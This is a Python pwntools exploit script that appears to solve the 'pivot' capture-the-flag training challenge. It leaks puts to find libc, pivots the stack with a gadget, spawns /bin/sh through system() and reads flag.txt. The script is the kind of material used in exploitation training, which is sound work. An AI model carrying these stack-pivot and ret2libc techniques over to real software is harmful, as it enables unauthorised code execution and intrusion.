import time

from pwn import *


EXECUTABLE = "./pivot"
context.binary = elf = ELF(EXECUTABLE)
libc = elf.libc
lib_pivot = ELF("./libpivot.so")


p = process(EXECUTABLE)
if args.GDB:
    gdb.attach(p)


OFFSET = 40
if OFFSET is None:
    p.sendafter(b"> ", b"AAAA")
    p.sendafter(b"> ", cyclic(128, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"))

    time.sleep(1)
    core = Coredump("./core")
    seg_addr = int("0x" + hex(core.fault_addr)[10:], 16)
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(seg_addr)}")
    offset = cyclic_find(seg_addr, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    log.success(f"Offset found: {offset}")
    exit()

def pivot_rop(pivot_addr: int) -> ROP:
    pivot = ROP(elf)
    pivot(rax=pivot_addr)
    pivot.raw(elf.symbols.usefulGadgets + 0x02) # xchg rsp, rax; ret;
    return pivot


# Get the current pivot point
p.recvuntil(b"to pivot: ")
pivot_point = int(p.recvline(keepends=False), 16)
log.debug(f"Pivot point: {hex(pivot_point)}")


# Leak the address of puts, to get the libc base address
puts_leak = ROP(elf)
puts_leak.puts(elf.got.puts)
puts_leak.main()

# Send the puts leak
log.debug("Puts leak:\n" + puts_leak.dump())
p.sendafter(b"> ", puts_leak.chain())
p.sendafter(b"> ", flat({ OFFSET: pivot_rop(pivot_point).chain() }))

# Get address of libc
p.recvuntil(b"Thank you!\n")
puts_addr = unpack(p.recvline(keepends=False).ljust(8, b"\x00"))
libc.address = puts_addr - libc.sym.puts
log.info(f"Libc lives at: {hex(libc.address)}")

# Get new pivot point
p.recvuntil(b"to pivot: ")
pivot_point = int(p.recvline(keepends=False), 16)
log.debug(f"Pivot point: {hex(pivot_point)}")

# Prepare system call
binsh = next(libc.search(b"/bin/sh"))
rop_system = ROP([elf, libc])
rop_system.system(binsh)

# Send system call
log.debug("ROP System:\n" + rop_system.dump())
p.sendafter(b"> ", rop_system.chain())
p.sendafter(b"> ", flat({ OFFSET: pivot_rop(pivot_point).chain() }))


p.recvline() # Thank you

# We now have a shell!
p.send(b"cat flag.txt\n")
flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
